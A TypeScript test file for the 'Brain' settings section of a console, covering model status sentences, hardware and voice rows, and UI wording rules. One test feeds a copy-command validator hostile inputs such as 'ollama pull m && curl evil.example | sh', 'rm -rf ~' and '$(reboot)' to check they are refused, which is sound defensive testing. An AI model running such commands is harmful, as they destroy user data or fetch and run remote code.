/**
 * Settings > Brain in the console: the routing mode and the local model's
 * state. Will's UI standard: Title Case labels, an UPPERCASE section header
 * (the .gsh class), every secondary line a complete concise sentence, and no
 * raw JSON, paths, model tags or config names on screen.
 *
 * The server writes every sentence and every name the section shows
 * (../src/inference-status, under its own tests); the section shows what it is
 * given. Its script is run here against small fakes, with real statuses built
 * by the server's own function.
 */
import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { createContext, runInContext } from 'node:vm';
import { EMBEDDING_MODEL, HARDWARE_TIERS, hardwareTier, hardwareTierFor } from '@flint/core';
import type { Hardware } from '../src/hardware';
import { readInferenceConfig, type InferenceMode } from '../src/inference-config';
import { inferenceStatus, transcriptionRow, type InferenceStatus } from '../src/inference-status';
import { planVoice } from '../src/voice';
import type { LocalBrains, NotConfined } from '../src/local-brains';
import type { ModelHealth } from '../src/local-monitor';

const html = readFileSync(join(__dirname, '..', '..', 'console', 'index.html'), 'utf8');
const section = /<div class="gsh">Brain<\/div>([\s\S]*?)<div class="gsh">Privacy<\/div>/.exec(html)![1]!;
const script = /\/\* -{10} Settings: Brain[\s\S]*?\*\/([\s\S]*?)\npollNotifs\(\);setInterval/.exec(html)![1]!;
const css = /<style>([\s\S]*?)<\/style>/.exec(html)![1]!;
const phoneCss = /@media \(max-width:600px\)\{([\s\S]*?)\n  \}/.exec(css)![1]!;
const mainScript = /<script>\n\/\* ---------- config ---------- \*\/([\s\S]*?)<\/script>/.exec(html)![1]!;
/** The page's own Local Only code (the switch, the pill, the mode that locks it), as the page runs it. */
const localOnlyJs = mainScript.slice(mainScript.indexOf('var LOCAL_ONLY=false;'), mainScript.indexOf('/* Flint is just Flint'));
/** The page's own request helper and its own way of turning an error into a sentence: the real ones, for the tests that need them. */
const lanesJs = /<script id="lanes-js">([\s\S]*?)<\/script>/.exec(html)![1]!;
const realLaneCall = lanesJs.slice(lanesJs.indexOf('function laneCall('), lanesJs.indexOf('/* ---------- the panel ---------- */'));
const realErrText = mainScript.slice(mainScript.indexOf('function errText('), mainScript.indexOf('function failed('));
/** A server sentence as the section shows it: the page's own apostrophe. */
const curly = (t: string): string => t.replace(/'/g, '’');

class El {
  textContent_ = '';
  hidden = false;
  disabled = false;
  className = '';
  attrs: Record<string, string> = {};
  on = false;
  children: El[] = [];
  focused = 0;
  classes = new Set<string>();
  classList = {
    toggle: (c: string, v: boolean) => {
      if (c === 'on') this.on = v;
      if (v) this.classes.add(c);
      else this.classes.delete(c);
    },
    contains: (c: string) => this.classes.has(c),
  };
  constructor(
    readonly mode?: string,
    private readonly doc?: { activeElement: El | null },
  ) {}
  get textContent(): string {
    return this.textContent_;
  }
  set textContent(v: string) {
    this.textContent_ = v;
    this.children = [];
  }
  getAttribute(k: string) {
    return k === 'data-mode' ? this.mode : this.attrs[k];
  }
  setAttribute(k: string, v: string) {
    this.attrs[k] = v;
  }
  removeAttribute(k: string) {
    delete this.attrs[k];
  }
  appendChild(c: El) {
    this.children.push(c);
    return c;
  }
  focus() {
    this.focused += 1;
    if (this.doc) this.doc.activeElement = this;
  }
  /** Everything a reader would see in this element. */
  shown(): string {
    return this.hidden ? '' : this.textContent_ + this.children.map((c) => c.shown()).join('');
  }
}

const IDS = ['modesub', 'lmval', 'lmsub', 'lmdot', 'lmcopy', 'brainmsg', 'modeseg', 'hwval', 'hwsub', 'sbrow', 'sbval', 'sbsub', 'sbdot', 'sbcopy', 'brainrows', 'brainerr', 'brainerrttl', 'brainerrsub', 'brainretry', 'brainnotes', 'settings', 'losub', 'lotoggle', 'lopill', 'sprow', 'spval', 'spsub', 'trrow', 'trval', 'trsub'];

/** What a real request to the server came to, for a test that runs the page's own `laneCall`: a status and a body, or a network that failed. */
type Wire = { status: number; body?: unknown; text?: string } | { fail: string };

type Clip = 'ok' | 'reject' | 'throw' | 'none';
function page(answers: { get?: () => unknown; post?: (body: unknown) => unknown; token?: string; clipboard?: Clip; wire?: (path: string, body?: unknown) => Wire } = {}) {
  const doc: { activeElement: El | null; body: El; getElementById: (id: string) => El; createElement: (t: string) => El } = {
    activeElement: null,
    body: new El(),
    getElementById: (id: string) => ids[id]!,
    createElement: () => new El(),
  };
  const buttons = ['local', 'hybrid', 'cloud'].map((m) => {
    const b = new El(m, doc);
    b.attrs.role = 'radio';
    b.disabled = true; // as the markup has them, until the first answer
    return b;
  });
  const ids: Record<string, El & { querySelectorAll?: () => El[] }> = Object.fromEntries(IDS.map((id) => [id, new El()]));
  ids.modeseg!.querySelectorAll = () => buttons;
  ids.sbrow!.hidden = true;
  ids.brainerr!.hidden = true;
  ids.brainnotes!.hidden = true;
  ids.lmcopy!.hidden = true;
  ids.sbcopy!.hidden = true;
  ids.sprow!.hidden = true;
  ids.trrow!.hidden = true;
  const calls: Array<{ path: string; body?: unknown }> = [];
  const copied: string[] = [];
  const timers: Array<() => void> = [];
  /** Timers still set, by id: what the page asked to be called later, and has not cancelled. */
  const pending = new Map<number, { fn: () => void; ms: number }>();
  let timerId = 0;
  const stored: Record<string, string> = {};
  const clip = answers.clipboard ?? 'ok';
  const c: Record<string, unknown> = {
    document: doc,
    $: (id: string) => ids[id]!,
    localStorage: { setItem: (k: string, v: string) => void (stored[k] = v), getItem: (k: string) => stored[k] ?? null },
    TOKEN: answers.token ?? 'tok',
    BASE: '',
    auth: () => ({ authorization: 'Bearer tok' }),
    openSettings: () => {},
    errText: (e: unknown) => String((e as { message?: string })?.message ?? e),
    laneCall: (path: string, body?: unknown) => {
      calls.push({ path, ...(body !== undefined ? { body } : {}) });
      try {
        return Promise.resolve(body === undefined ? answers.get?.() : answers.post?.(body));
      } catch (e) {
        return Promise.reject(e);
      }
    },
    // The network, for a page that runs its own `laneCall`: what the server (or nothing at all) answered.
    fetch: (url: string, init?: { method?: string; body?: string }) => {
      const body = init?.body === undefined ? undefined : (JSON.parse(init.body) as unknown);
      calls.push({ path: url, ...(body !== undefined ? { body } : {}) });
      const w = answers.wire!(url, body);
      if ('fail' in w) return Promise.reject(new TypeError(w.fail));
      const text = w.text ?? (w.body === undefined ? '' : JSON.stringify(w.body));
      return Promise.resolve({ ok: w.status >= 200 && w.status < 300, status: w.status, json: () => (text ? Promise.resolve().then(() => JSON.parse(text) as unknown) : Promise.reject(new SyntaxError('Unexpected end of JSON input'))) });
    },
    navigator:
      clip === 'none'
        ? {}
        : {
            clipboard: {
              writeText: (t: string) => {
                if (clip === 'throw') throw new Error('NotAllowedError');
                if (clip === 'reject') return Promise.reject(new Error('NotAllowedError'));
                copied.push(t);
                return Promise.resolve();
              },
            },
          },
    setTimeout: (fn: () => void, ms = 0) => {
      timers.push(fn);
      pending.set(++timerId, { fn, ms });
      return timerId;
    },
    clearTimeout: (id: number) => void pending.delete(id),
  };
  createContext(c);
  // The page's own Local Only switch, then the section. With `wire`, the page's own request helper and error
  // sentences too: nothing between the section and the network is a stand-in.
  runInContext(localOnlyJs, c);
  if (answers.wire) runInContext(`${realErrText}\n${realLaneCall}`, c);
  runInContext(script, c);
  const run = (code: string) => runInContext(code, c);
  const render = (d: unknown) => {
    (c as { __d: unknown }).__d = d;
    run('renderBrain(__d)');
  };
  /** Every word the section has on screen. */
  const rowOf = (id: string): string | undefined => (id.startsWith('sb') ? 'sbrow' : id.startsWith('sp') ? 'sprow' : id.startsWith('tr') ? 'trrow' : undefined);
  const screen = () => [ids.brainrows!.hidden ? '' : ['modesub', 'lmval', 'lmsub', 'sbval', 'sbsub', 'hwval', 'hwsub', 'spval', 'spsub', 'trval', 'trsub'].map((id) => (rowOf(id) && ids[rowOf(id)!]!.hidden ? '' : ids[id]!.shown())).join(' '), ids.brainerr!.hidden ? '' : `${ids.brainerrttl!.shown()} ${ids.brainerrsub!.shown()}`, ids.brainnotes!.shown(), ids.brainmsg!.shown()].join(' ');
  /** Settings is open or closed, as the page's own panel code marks it. */
  const open = (on: boolean) => ids.settings!.classList.toggle('open', on);
  /** Let the timers the page has set and not cancelled run, as if their time had passed. */
  const tick = () => {
    const due = [...pending.entries()];
    pending.clear();
    for (const [, t] of due) t.fn();
  };
  return { ids, buttons, calls, copied, timers, pending, tick, open, stored, run, render, screen, doc, c };
}

const settle = async () => {
  for (let i = 0; i < 10; i++) await new Promise((r) => setTimeout(r, 0));
};

// ---- real statuses, from the server's own function
const MAIN = hardwareTier('48gb').model;
const SMALL = hardwareTier('48gb').fallbackModel!;
const MAC: Hardware = { platform: 'darwin', arch: 'arm64', accelerator: 'apple-silicon', memoryGb: 64, systemMemoryGb: 64, chip: 'Apple M5 Max', notes: [] };
interface Shape {
  mode?: InferenceMode;
  modeSource?: InferenceStatus['modeSource'];
  env?: Record<string, string>;
  hardware?: Hardware | null;
  model?: string;
  settled?: boolean;
  primary?: Partial<ModelHealth>;
  standby?: Partial<ModelHealth> | null;
  backend?: boolean;
  wire?: 'ollama' | 'openai';
  notConfined?: NotConfined;
}
function status(o: Shape = {}): InferenceStatus {
  const model = o.model ?? MAIN;
  const hardware = o.hardware === null ? undefined : o.hardware ?? MAC;
  const health = (m: string, over: Partial<ModelHealth> = {}): ModelHealth => ({ model: m, state: 'loaded', since: 1, checkedAt: 1, ...over });
  const local = {
    cfg: readInferenceConfig(o.env ?? {}),
    wire: o.wire ?? 'ollama',
    server: 'ollama',
    endpoint: { host: '127.0.0.1:11434', loopback: true },
    primary: { model, settled: o.settled ?? true, from: 'tier', numCtx: 16384, provider: { getCapabilities: () => ({ maxContextTokens: 16384, toolCalling: 'native' }) } },
    ...(o.standby === null || o.standby === undefined ? {} : { fallback: { model: SMALL, settled: true } }),
    backend: o.backend === false ? undefined : {},
    confined: o.notConfined ? { ok: false, why: o.notConfined } : { ok: true },
  } as unknown as LocalBrains;
  return inferenceStatus({
    mode: o.mode ?? 'hybrid',
    modeSource: o.modeSource ?? 'settings',
    ...(hardware ? { hardware, tier: hardwareTierFor(hardware) } : {}),
    tierSource: 'detected',
    local,
    snapshot: { server: 'ollama', reachable: true, primary: health(model, o.primary), ...(o.standby ? { fallback: health(SMALL, o.standby) } : {}) },
    embedding: { model: EMBEDDING_MODEL.model, installed: true },
    voice: planVoice(readInferenceConfig(o.env ?? {}), { OPENAI_API_KEY: 'sk-test', ...(o.env ?? {}) }, { platform: 'darwin', home: '/home/will' }),
  });
}

describe('the Brain section', () => {
  it('sits in Settings above Privacy, under its own section header', () => {
    expect(html.indexOf('<div class="gsh">Brain</div>')).toBeGreaterThan(html.indexOf('<div class="gsh">Connected Systems</div>'));
    expect(html.indexOf('<div class="gsh">Brain</div>')).toBeLessThan(html.indexOf('<div class="gsh">Privacy</div>'));
    // Section headers are uppercase on screen: the .gsh class does it.
    expect(html).toMatch(/\.gsh\{[^}]*text-transform:uppercase/);
  });

  it('labels and buttons are Title Case', () => {
    const labels = [...section.matchAll(/<b[^>]*>([^<]+)<\/b>|<button[^>]*>([^<]+)<\/button>/g)].map((m) => m[1] ?? m[2]);
    expect(labels).toEqual(['Mode', 'Local', 'Hybrid', 'Cloud', 'Local Model', 'Copy Command', 'Standby Model', 'Copy Command', 'Hardware', 'Speech', 'Transcription', 'Couldn’t Load Brain', 'Try Again']);
    const titles = [...labels, ...[...script.matchAll(/brainFail\('([^']+)'/g)].map((m) => m[1]!), 'Copied'];
    expect(titles).toContain('Not Signed In');
    for (const l of titles) for (const w of l!.split(' ')) expect(w[0], l!).toBe(w[0]!.toUpperCase());
  });

  it('the mode is a three-way choice Will makes, and each choice says its own name to assistive tech', () => {
    expect(section).toContain('role="radiogroup" aria-label="Mode" aria-describedby="modesub" onkeydown="modeKey(event)"');
    expect(section.match(/role="radio"/g)).toHaveLength(3);
    expect(section).toContain(`onclick="setMode('local')"`);
    expect(section).toContain(`onclick="setMode('hybrid')"`);
    expect(section).toContain(`onclick="setMode('cloud')"`);
    // Until the first answer the three cannot be pressed, and one of them is in the tab order.
    expect(section.match(/role="radio"[^>]* disabled>/g)).toHaveLength(3);
    expect(section.match(/tabindex="0"/g)).toHaveLength(1);
    expect(section.match(/tabindex="-1"/g)).toHaveLength(2);
  });

  it("every line the page itself writes is a complete, concise sentence (the rest are the server's, under its own tests)", () => {
    const own = [...script.replace(/\/\*[\s\S]*?\*\//g, '').matchAll(/'((?:[A-Z][a-z’]+ )[^']*[a-z][.])'/g)].map((m) => m[1]!);
    expect([...new Set(own)].sort()).toEqual(
      ['Add your access token below to see this.', 'Flint couldn’t copy the command.', 'Flint couldn’t save the mode.', 'Flint is checking.', 'Flint isn’t answering.', 'Paste it in Terminal to download the model.'].sort(),
    );
    const markup = [...section.matchAll(/<span id="[a-z]+"[^>]*>([^<]+)<\/span>/g)].map((m) => m[1]!);
    expect(markup).toEqual(['Flint is checking.', 'Flint is checking.', 'Flint is checking.', 'Flint isn’t answering.']);
    for (const line of [...own, ...markup]) {
      expect(line, line).toMatch(/^[A-Z][^.!?:;]*\.$/);
      expect(line.length, line).toBeLessThanOrEqual(48);
    }
    // No fragment is left: not the old "Checking…".
    expect(section).not.toContain('Checking…');
    expect(script).not.toContain('Checking…');
  });

  it('the page keeps no sentence table of its own to drift from the server: the mode and the models say what the server sent', () => {
    expect(script).not.toMatch(/MODE_LINES|MODEL_LINES|STANDBY_LINES|hardwareLine|hardwareName/);
    expect(script).toContain('brainMode(d.mode,d.modeSentence);');
    expect(script).toContain("brainEl('modesub').textContent=brainText(sentence)||BRAIN_CHECKING;");
    expect(script).toContain("brainEl('lmval').textContent=brainText(p.name);");
    expect(script).toContain("brainEl('lmsub').textContent=brainText(p.sentence)||BRAIN_CHECKING;");
  });

  it('nothing in the markup is raw JSON, a path, an address or a config name', () => {
    expect(section.replace(/<[^>]+>/g, ' ')).not.toMatch(/[{}\[\]]|\/|https?:|FLINT_|OLLAMA_|num_ctx|127\.0\.0\.1|localhost|_/);
  });
});

describe('what it shows', () => {
  it('before the first answer: every row says Flint is checking, nothing is selected, and nothing can be pressed or copied', async () => {
    let answer!: (d: unknown) => void;
    const p = page({ get: () => new Promise((r) => (answer = r)) });
    p.run('loadBrain()');
    expect(p.ids.brainrows!.hidden).toBe(false);
    expect(p.ids.brainerr!.hidden).toBe(true);
    expect([p.ids.modesub!.textContent, p.ids.lmsub!.textContent, p.ids.hwsub!.textContent]).toEqual(['Flint is checking.', 'Flint is checking.', 'Flint is checking.']);
    expect(p.buttons.every((b) => b.disabled && !b.on && b.attrs['aria-checked'] === 'false')).toBe(true);
    expect(p.ids.lmdot!.className).toBe('st unknown');
    expect([p.ids.lmcopy!.hidden, p.ids.sbcopy!.hidden, p.ids.sbrow!.hidden]).toEqual([true, true, true]);
    answer(status());
    await settle();
    expect(p.buttons.every((b) => !b.disabled)).toBe(true);
    expect(p.ids.lmsub!.textContent).toBe('It is ready.');
  });

  it('the mode in force is the selected choice, with its sentence; the model is shown by its display name and its state is a sentence', async () => {
    const p = page({ get: () => status() });
    p.run('loadBrain()');
    await settle();
    expect(p.calls).toEqual([{ path: '/inference' }]);
    expect(p.buttons.map((b) => b.on)).toEqual([false, true, false]);
    expect(p.buttons.map((b) => b.attrs['aria-checked'])).toEqual(['false', 'true', 'false']);
    expect(p.ids.modesub!.textContent).toBe('Flint picks this Mac or the cloud for each message.');
    expect(p.ids.lmval!.textContent).toBe('Muse Glimmer 30B');
    expect(p.ids.lmsub!.textContent).toBe('It is ready.');
    expect(p.ids.lmdot!.className).toBe('st ok');
    expect(p.ids.lmcopy!.hidden).toBe(true);
    // The machine: its chip, and what its memory is enough for.
    expect(p.ids.hwval!.textContent).toBe('Apple M5 Max');
    expect(p.ids.hwsub!.textContent).toBe('This Mac has 64 GB of memory, enough for the largest model.');
    expect(p.ids.brainnotes!.hidden).toBe(true);
  });

  it('ONLY display names are on screen: no model tag, in any state, for a model in the table or not', () => {
    const p = page();
    const models = [...new Set(HARDWARE_TIERS.flatMap((t) => [t.model, t.fallbackModel])), 'qwen3.6:35b', 'hf.co/someone/odd_repo:Q4_K_M'].filter((m): m is string => !!m);
    const states: Array<Partial<ModelHealth>> = [{ state: 'loaded' }, { state: 'cold' }, { state: 'loading' }, { state: 'unavailable', why: 'not_installed' }, { state: 'unavailable', why: 'unreachable' }];
    for (const model of models) {
      for (const primary of states) {
        for (const mode of ['local', 'hybrid', 'cloud'] as const) {
          const st = status({ model, mode, primary, standby: primary });
          p.render(st);
          const text = p.screen();
          expect(text, model).not.toContain(model);
          expect(text, model).not.toContain(SMALL);
          expect(text, model).not.toMatch(/[a-z0-9]:[0-9a-z]|ollama pull|\//i);
          expect(p.ids.lmval!.textContent).toBe(st.local.primary.name);
          expect(p.ids.sbval!.textContent).toBe('Llama 3.2 3B');
        }
      }
    }
    // The tag is in the status all the while (the command line shows it): the page is what leaves it out.
    expect(JSON.stringify(status())).toContain(MAIN);
  });

  it('each state of the local model has its own sentence and dot, true for the mode', () => {
    const p = page();
    const cases: Array<[Shape, string, string]> = [
      [{ primary: { state: 'loaded' } }, 'It is ready.', 'st ok'],
      [{ mode: 'hybrid', primary: { state: 'cold' } }, 'It is not loaded. It loads when a message needs it.', 'st off'],
      // In Cloud mode nothing is about to load it: only a private message would.
      [{ mode: 'cloud', primary: { state: 'cold' } }, 'It is not loaded. It loads when a private message needs it.', 'st off'],
      [{ primary: { state: 'loading' } }, 'It is loading now.', 'st degraded'],
      [{ primary: { state: 'unavailable', why: 'unreachable' } }, "The local model server isn't answering.", 'st down'],
      [{ primary: { state: 'unavailable', why: 'not_installed' } }, "It isn't downloaded yet.", 'st down'],
      [{ primary: { state: 'unavailable', why: 'unreachable', checkedAt: 0 } }, 'Flint is checking.', 'st unknown'],
      [{ settled: false, model: 'none', primary: { state: 'unavailable', why: 'unsettled' } }, "No local model is chosen yet, because the local model server isn't answering.", 'st down'],
    ];
    for (const [shape, line, dot] of cases) {
      p.render(status(shape));
      expect(p.ids.lmsub!.textContent, JSON.stringify(shape)).toBe(curly(line));
      expect(p.ids.lmdot!.className, JSON.stringify(shape)).toBe(dot);
    }
    // No model chosen: no name is shown, and not a placeholder's.
    expect(p.ids.lmval!.textContent).toBe('');
  });

  it('a local model that cannot be used from here says why, with a red dot, whatever its state', () => {
    const p = page();
    p.render(status({ notConfined: 'remote_host', primary: { state: 'loaded' } }));
    expect(p.ids.lmsub!.textContent).toBe('The local model server is on another machine, so Local and Hybrid modes will not use it.');
    expect(p.ids.lmdot!.className).toBe('st down');
  });

  it('...and the standby on that same server does not say it answers: it is not used either, and its dot is not green', () => {
    const p = page();
    for (const why of ['remote_host', 'proxy', 'cloud_model'] as const) {
      for (const mode of ['local', 'hybrid'] as const) {
        p.render(status({ mode, notConfined: why, primary: { state: 'loaded' }, standby: { state: 'loaded' } }));
        // (A cloud model is asked through this Mac's own server, where the standby does run: its row says the real reason.)
        expect(p.ids.sbsub!.textContent, `${why} ${mode}`).toBe(why === 'cloud_model' ? 'It is not used while the main model is a cloud model.' : 'It is on the same server, so it is not used either.');
        expect(p.ids.sbdot!.className, `${why} ${mode}`).toBe('st off');
        expect(p.screen(), `${why} ${mode}`).not.toContain('answers while the main model loads');
      }
      // Cloud mode says what it always says of the standby.
      p.render(status({ mode: 'cloud', notConfined: why, standby: { state: 'loaded' } }));
      expect(p.ids.sbsub!.textContent).toBe('Cloud mode doesn’t use it.');
    }
    // Usable from here, it is green and answers, as before.
    p.render(status({ mode: 'hybrid', standby: { state: 'loaded' } }));
    expect(p.ids.sbsub!.textContent).toBe('It answers while the main model loads.');
    expect(p.ids.sbdot!.className).toBe('st ok');
  });

  it("a refused address: the row says what was wrong with it, each class in its own sentence (never 'isn't on this Mac' for all of them)", () => {
    const p = page();
    const said = new Set<string>();
    for (const url of ['nonsense', 'ftp://127.0.0.1:1', 'http://u:p@127.0.0.1:1', 'http://127.0.0.1:1/?q=1', 'http://127.0.0.1:1/a/b/c/d', 'http://gpu-box.example:1/v1']) {
      p.render(status({ wire: 'openai', backend: false, settled: false, notConfined: 'config', env: { FLINT_LOCAL_PROVIDER: 'openai', FLINT_LOCAL_BASE_URL: url }, primary: { state: 'unavailable', why: 'config' } }));
      const line = p.ids.lmsub!.textContent;
      expect(line, url).toMatch(/^The local model server’s address .+, so the local model is off\.$/);
      expect(p.screen(), url).not.toMatch(/FLINT_|https?:|gpu-box|127\.0\.0\.1/);
      expect(p.ids.lmdot!.className).toBe('st down');
      expect(p.ids.lmcopy!.hidden).toBe(true);
      said.add(line);
    }
    expect(said.size).toBe(6);
  });

  it('a model that is not downloaded offers Copy Command, which copies the exact command and runs nothing', async () => {
    const p = page({ get: () => status({ primary: { state: 'unavailable', why: 'not_installed' } }) });
    p.run('loadBrain()');
    await settle();
    expect(p.ids.lmcopy!.hidden).toBe(false);
    expect(p.ids.lmcopy!.textContent).toBe('Copy Command');
    // The command itself is never put on screen: only the button is.
    expect(p.screen()).not.toContain('ollama pull');
    p.run("copyPull('main')");
    await settle();
    expect(p.copied).toEqual([`ollama pull ${MAIN}`]);
    expect(p.ids.lmcopy!.textContent).toBe('Copied');
    // What to do with it, in a sentence.
    expect(p.ids.lmsub!.textContent).toBe('Paste it in Terminal to download the model.');
    expect(p.ids.brainmsg!.textContent).toBe('');
    // A moment later the button offers the command again.
    p.timers.forEach((t) => t());
    expect(p.ids.lmcopy!.textContent).toBe('Copy Command');
    expect(p.calls).toEqual([{ path: '/inference' }]);
  });

  it('a copy that fails says so in a sentence, never silently: a refused clipboard, one that throws, and none at all', async () => {
    for (const clipboard of ['reject', 'throw', 'none'] as const) {
      const p = page({ clipboard });
      p.render(status({ primary: { state: 'unavailable', why: 'not_installed' } }));
      p.run("copyPull('main')");
      await settle();
      expect(p.ids.brainmsg!.textContent, clipboard).toBe('Flint couldn’t copy the command.');
      expect(p.ids.lmcopy!.textContent, clipboard).toBe('Copy Command');
      expect(p.ids.lmsub!.textContent, clipboard).toBe('It isn’t downloaded yet.');
      expect(p.copied).toEqual([]);
    }
  });

  it('only a string of the exact shape "ollama pull <tag>" is ever offered or copied', async () => {
    const p = page();
    const withPull = (pull: unknown) => p.render({ mode: 'local', local: { confined: true, primary: { name: 'X', state: 'unavailable', why: 'not_installed', sentence: "It isn't downloaded yet.", pull }, standby: { name: 'Y', state: 'unavailable', sentence: 'S.', pull } } });
    for (const bad of ['ollama pull m; rm -rf ~', 'ollama pull m && curl evil.example | sh', 'ollama  pull m', 'ollama pull', 'ollama pull -h', 'OLLAMA PULL m', 'curl evil.example | sh', 'ollama pull m\nrm -rf ~', 'ollama pull $(reboot)', 'ollama pull m ', ' ollama pull m', 42, null, { pull: 'ollama pull m' }, `ollama pull ${'m'.repeat(200)}`]) {
      withPull(bad);
      expect(p.ids.lmcopy!.hidden, JSON.stringify(bad)).toBe(true);
      expect(p.ids.sbcopy!.hidden, JSON.stringify(bad)).toBe(true);
      p.run("copyPull('main')");
      p.run("copyPull('standby')");
    }
    await settle();
    expect(p.copied).toEqual([]);
    for (const good of ['ollama pull m', 'ollama pull qwen2.5:7b', 'ollama pull hf.co/org/repo:Q4_K_M', 'ollama pull nomic-embed-text']) {
      withPull(good);
      expect(p.ids.lmcopy!.hidden, good).toBe(false);
      p.run("copyPull('main')");
    }
    await settle();
    expect(p.copied).toEqual(['ollama pull m', 'ollama pull qwen2.5:7b', 'ollama pull hf.co/org/repo:Q4_K_M', 'ollama pull nomic-embed-text']);
    // Even a command put there by something else is checked again at the moment of copying.
    p.run("BRAIN_PULL.main='rm -rf ~'");
    p.run("copyPull('main')");
    await settle();
    expect(p.copied).toHaveLength(4);
  });

  it('the standby model has its own row: its name, a sentence that is true for the mode, and its own Copy Command', async () => {
    const p = page();
    p.render(status({ standby: null }));
    expect(p.ids.sbrow!.hidden).toBe(true); // none configured: no row
    p.render(status({ mode: 'hybrid', standby: { state: 'loaded' } }));
    expect(p.ids.sbrow!.hidden).toBe(false);
    expect(p.ids.sbval!.textContent).toBe('Llama 3.2 3B');
    expect(p.ids.sbsub!.textContent).toBe('It answers while the main model loads.');
    expect(p.ids.sbdot!.className).toBe('st ok');
    expect(p.ids.sbcopy!.hidden).toBe(true);
    // Cloud mode never asks the standby, so the row does not say it answers.
    p.render(status({ mode: 'cloud', standby: { state: 'loaded' } }));
    expect(p.ids.sbsub!.textContent).toBe('Cloud mode doesn’t use it.');
    p.render(status({ mode: 'local', standby: { state: 'cold' } }));
    expect(p.ids.sbsub!.textContent).toBe('It is not loaded. It loads when the main model is not ready.');
    expect(p.ids.sbdot!.className).toBe('st off');
    p.render(status({ mode: 'local', standby: { state: 'unavailable', why: 'not_installed' } }));
    expect(p.ids.sbsub!.textContent).toBe('It isn’t downloaded, so nothing answers while the main model loads.');
    expect(p.ids.sbcopy!.hidden).toBe(false);
    p.run("copyPull('standby')");
    await settle();
    expect(p.copied).toEqual([`ollama pull ${SMALL}`]);
    expect(p.ids.sbcopy!.textContent).toBe('Copied');
    expect(p.ids.sbsub!.textContent).toBe('Paste it in Terminal to download the model.');
    // The main model's button is untouched, and has nothing to copy.
    p.run("copyPull('main')");
    await settle();
    expect(p.copied).toEqual([`ollama pull ${SMALL}`]);
  });

  it('a standby is optional: missing or unreachable, its dot is never red', () => {
    const p = page();
    for (const standby of [{ state: 'unavailable', why: 'not_installed' }, { state: 'unavailable', why: 'unreachable' }, { state: 'unavailable', why: 'error' }] as Array<Partial<ModelHealth>>) {
      p.render(status({ standby }));
      expect(p.ids.sbdot!.className, JSON.stringify(standby)).toBe('st off');
    }
    // The main model missing is a red dot: that one is needed.
    p.render(status({ primary: { state: 'unavailable', why: 'not_installed' }, standby: { state: 'loaded' } }));
    expect(p.ids.lmdot!.className).toBe('st down');
  });

  it('the machine: a CPU Only machine, and one Flint has not looked at yet', () => {
    const p = page();
    p.render(status({ hardware: { platform: 'linux', arch: 'x64', accelerator: 'none', memoryGb: 0, systemMemoryGb: 16, notes: [] } }));
    expect(p.ids.hwval!.textContent).toBe('No Graphics Card');
    expect(p.ids.hwsub!.textContent).toBe('This machine has no graphics card Flint can use, so models run on its processor.');
    p.render(status({ hardware: null }));
    expect(p.ids.hwval!.textContent).toBe('');
    expect(p.ids.hwsub!.textContent).toBe('Flint is checking.');
  });

  it('what speaks and what hears: a name and a sentence each, from the server, true for the mode', () => {
    const p = page();
    p.render(status({ mode: 'hybrid' }));
    expect([p.ids.sprow!.hidden, p.ids.trrow!.hidden]).toEqual([false, false]);
    expect(p.ids.spval!.textContent).toBe('OpenAI');
    expect(p.ids.spsub!.textContent).toBe('It speaks replies. A reply that stays on this Mac is spoken by the device instead.');
    expect(p.ids.trval!.textContent).toBe('Whisper Base English');
    expect(p.ids.trsub!.textContent).toBe('Your voice is turned into text on this Mac.');
    // In Local mode the outside service is not used, and the row says that instead.
    p.render(status({ mode: 'local' }));
    expect(p.ids.spsub!.textContent).toBe('Local mode doesn’t use it, so each device speaks with its own voice.');
    // The Mac's own voice, a local speech server, and off.
    p.render(status({ env: { FLINT_TTS_PROVIDER: 'say', FLINT_SAY_VOICE: 'Samantha' } }));
    expect([p.ids.spval!.textContent, p.ids.spsub!.textContent]).toEqual(['Samantha', 'Replies are spoken on this Mac, and nothing is sent out.']);
    p.render(status({ env: { FLINT_TTS_PROVIDER: 'local', FLINT_LOCAL_TTS_BASE_URL: 'http://127.0.0.1:8880/v1', FLINT_STT_PROVIDER: 'local', FLINT_LOCAL_STT_BASE_URL: 'http://127.0.0.1:8081/v1' } }));
    expect([p.ids.spval!.textContent, p.ids.spsub!.textContent]).toEqual(['Local Speech Server', 'Replies are spoken by the speech server on this Mac, and nothing is sent out.']);
    expect([p.ids.trval!.textContent, p.ids.trsub!.textContent]).toEqual(['Local Speech Server', 'Your voice is turned into text by the speech server on this Mac.']);
    p.render(status({ env: { FLINT_TTS_PROVIDER: 'off' } }));
    expect([p.ids.spval!.textContent, p.ids.spsub!.textContent]).toEqual(['Off', 'Each device speaks with its own voice.']);
  });

  // One name is shown as it is set: a voice of the Mac's own, which the Mac itself names with brackets
  // ("Eddy (English (US))"). Config takes one only as letters, spaces, brackets and hyphens, so it is a name and
  // nothing else. Everything else in the two rows is words Flint wrote.
  it('nothing in the voice rows is a tag, a key, a path or an address, whatever the settings; a voice of the Mac is shown as the Mac names it', () => {
    const p = page();
    const envs: Array<Record<string, string>> = [
      {},
      { FLINT_TTS_PROVIDER: 'say', FLINT_SAY_VOICE: 'Eddy (English (US))' },
      { FLINT_TTS_PROVIDER: 'local', FLINT_LOCAL_TTS_BASE_URL: 'http://127.0.0.1:8880/v1', FLINT_LOCAL_TTS_MODEL: 'kokoro-v1.0:q8', FLINT_LOCAL_TTS_VOICE: 'af_heart' },
      { FLINT_STT_PROVIDER: 'local', FLINT_LOCAL_STT_BASE_URL: 'http://127.0.0.1:8081/v1', FLINT_LOCAL_STT_MODEL: 'Systran/faster-whisper-small.en' },
      { WHISPER_MODEL: '/Users/someone/models/ggml-large-v3-turbo-q5_0.bin', FLINT_TTS_MODEL: 'tts-1-hd', FLINT_TTS_VOICE: 'nova' },
      { FLINT_TTS_PROVIDER: 'nonsense', FLINT_STT_PROVIDER: 'cloud' },
      { FLINT_LOCAL_ALLOW_REMOTE: '1', FLINT_TTS_PROVIDER: 'local', FLINT_LOCAL_TTS_BASE_URL: 'https://speech.example/v1' },
    ];
    for (const env of envs) {
      for (const mode of ['local', 'hybrid', 'cloud'] as const) {
        p.render(status({ env, mode }));
        const shown = [p.ids.spval!.textContent, p.ids.spsub!.textContent, p.ids.trval!.textContent, p.ids.trsub!.textContent];
        const macVoice = env.FLINT_TTS_PROVIDER === 'say' ? env.FLINT_SAY_VOICE : undefined;
        if (macVoice) expect(p.ids.spval!.textContent).toBe(macVoice);
        for (const text of shown) {
          if (macVoice && text === macVoice) {
            expect(text).toMatch(/^[A-Za-z][A-Za-z ()-]{0,39}$/);
            continue;
          }
